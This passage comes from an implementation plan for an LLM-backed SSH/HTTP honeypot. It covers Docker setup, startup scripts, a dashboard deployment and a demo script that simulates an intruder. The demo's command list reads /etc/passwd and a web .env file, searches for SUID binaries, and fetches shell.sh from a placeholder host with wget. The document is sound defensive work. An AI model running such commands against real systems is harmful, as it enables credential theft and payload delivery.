def generate_session_report(session_id: str):
    from layer3.report_generator import generate_report
    report = generate_report(session_id)
    return {"report": report}
```

- [ ] **Step 4: Verify in browser**

```bash
npm run dev
```
Navigate to /sessions and /reports, confirm session list and replay work.

- [ ] **Step 5: Commit**

```bash
git add layer3/frontend/src/pages/ layer3/stats_api.py
git commit -m "feat: Sessions replay page and Reports page with LLM generation"
```

---

## Task 18: Docker Compose + Startup Scripts

**Files:**
- Create: `docker-compose.yml`
- Create: `scripts/start.sh`

- [ ] **Step 1: Create `docker-compose.yml`**

```yaml
version: "3.9"
services:
  layer2:
    build: .
    command: uvicorn layer2.main:app --host 0.0.0.0 --port 8000
    ports:
      - "8000:8000"
    volumes:
      - .:/app
    working_dir: /app
    env_file: .env

  layer3-api:
    build: .
    command: uvicorn layer3.stats_api:app --host 0.0.0.0 --port 8001
    ports:
      - "8001:8001"
    volumes:
      - .:/app
    working_dir: /app
    env_file: .env
    depends_on:
      - layer2

  layer1-ssh:
    build: .
    command: python layer1/ssh_server.py
    ports:
      - "2222:2222"
    volumes:
      - .:/app
    working_dir: /app
    env_file: .env
    depends_on:
      - layer2

  layer1-http:
    build: .
    command: python layer1/http_server.py
    ports:
      - "8080:8080"
    volumes:
      - .:/app
    working_dir: /app
    env_file: .env
    depends_on:
      - layer2
```

- [ ] **Step 2: Create `Dockerfile`**

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
```

- [ ] **Step 3: Create `scripts/start.sh` (for running without Docker)**

```bash
#!/usr/bin/env bash
set -e
cd "$(dirname "$0")/.."

echo "[*] Starting Layer 2 (LLM Engine)..."
uvicorn layer2.main:app --port 8000 --log-level warning &
L2_PID=$!

sleep 1
echo "[*] Starting Layer 3 (Stats API)..."
uvicorn layer3.stats_api:app --port 8001 --log-level warning &
L3_PID=$!

echo "[*] Starting Layer 1 SSH..."
python layer1/ssh_server.py &
SSH_PID=$!

echo "[*] Starting Layer 1 HTTP..."
python layer1/http_server.py &
HTTP_PID=$!

echo ""
echo "HoneyPot running:"
echo "  SSH    → port 2222"
echo "  HTTP   → port 8080"
echo "  LLM    → port 8000"
echo "  API    → port 8001"
echo ""
echo "Press Ctrl+C to stop all services"
trap "kill $L2_PID $L3_PID $SSH_PID $HTTP_PID 2>/dev/null; exit 0" INT
wait
```

```bash
chmod +x scripts/start.sh
```

- [ ] **Step 4: Commit**

```bash
git add docker-compose.yml Dockerfile scripts/start.sh
git commit -m "feat: Docker Compose and startup script for all services"
```

---

## Task 19: Demo Script + Vercel Deploy

**Files:**
- Create: `scripts/demo.sh`
- Create: `layer3/frontend/vercel.json`

- [ ] **Step 1: Create `scripts/demo.sh`**

```bash
#!/usr/bin/env bash
# Automated attacker simulation for demo purposes
set -e

SSH_PORT=${SSH_PORT:-2222}
HOST=${1:-localhost}

echo "=== HoneyPot Demo: Simulated Attack ==="
echo "Target: $HOST:$SSH_PORT"
echo ""

# Feed commands via sshpass (install: brew install hudochenkov/sshpass/sshpass)
command -v sshpass >/dev/null || { echo "Install sshpass first: brew install hudochenkov/sshpass/sshpass"; exit 1; }

CMDS=(
  "whoami"
  "id"
  "uname -a"
  "ls /home"
  "cat /etc/passwd"
  "ls /var/www/html"
  "cat /var/www/html/.env"
  "sudo -l"
  "cat /home/admin/backup.sql"
  "find / -perm -u=s -type f 2>/dev/null"
  "wget http://example.com/shell.sh"
  "exit"
)

CMD_STRING=$(printf '%s\n' "${CMDS[@]}")

sshpass -p 'password' ssh -p "$SSH_PORT" \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  "attacker@$HOST" <<EOF
$CMD_STRING
EOF

echo ""
echo "=== Attack complete. Check the dashboard at http://localhost:5173 ==="
echo "=== Generate report via: curl -X POST http://localhost:8001/api/reports/<session_id>/generate ==="
```

```bash
chmod +x scripts/demo.sh
```

- [ ] **Step 2: Create `layer3/frontend/vercel.json`**

```json
{
  "rewrites": [
    { "source": "/api/:path*", "destination": "https://YOUR_STATS_API_URL/api/:path*" },
    { "source": "/ws/:path*", "destination": "https://YOUR_STATS_API_URL/ws/:path*" },
    { "source": "/(.*)", "destination": "/index.html" }
  ]
}
```

- [ ] **Step 3: Build frontend and verify**

```bash
cd layer3/frontend && npm run build
```
Expected: `dist/` folder generated with no TypeScript errors.

- [ ] **Step 4: Deploy to Vercel**

```bash
cd layer3/frontend
npx vercel --prod
# Set VITE_API_URL in Vercel dashboard to your glows.ai stats API URL
```

- [ ] **Step 5: Run full end-to-end test**

```bash
# Terminal 1: start all services
./scripts/start.sh

# Terminal 2: run demo attack
./scripts/demo.sh

# Verify:
# 1. Dashboard shows the attack in live feed
# 2. Sessions page shows the session with commands
# 3. Reports page generates a Markdown threat report
```

- [ ] **Step 6: Final commit**

```bash
git add scripts/demo.sh layer3/frontend/vercel.json
git commit -m "feat: demo attack script and Vercel deployment config"
```

---

## Self-Review

**Spec coverage check:**

| Spec Requirement | Covered by Task |
|---|---|
| SSH honeypot (paramiko, any-password) | Task 11 |
| HTTP honeypot (WordPress persona) | Task 12 |
| Rule-based cache for common commands | Task 5 |
| Ollama client (streaming, configurable model) | Task 8 |
| Intent classifier (keyword + LLM fallback) | Task 6 |
| Ubuntu 18.04 persona prompt | Task 7 |
| FastAPI /respond endpoint | Task 9 |
| SQLite schema (sessions, commands, http_requests) | Task 2 |
| Logger (session start/end, commands, http_requests) | Task 3 |
| Session manager (state, cd, history) | Task 4 |
| Stats API (sessions, intents, commands, timeline) | Task 13 |
| WebSocket live feed | Task 13 |
| Report generator (LLM Markdown) | Task 14 |
| React dashboard (live feed, charts) | Task 16 |
| Sessions replay page | Task 17 |
| Reports page | Task 17 |
| .env configurable model | Task 1 |
| Docker Compose | Task 18 |
| Demo script | Task 19 |
| Vercel deploy | Task 19 |

**Placeholder scan:** No TBD, TODO, or vague steps found. Every step has exact commands or complete code.

**Type consistency:** `Logger`, `SessionManager`, `CacheHandler`, `classify()`, `build_messages()`, `generate()` names are consistent across all tasks that reference them.
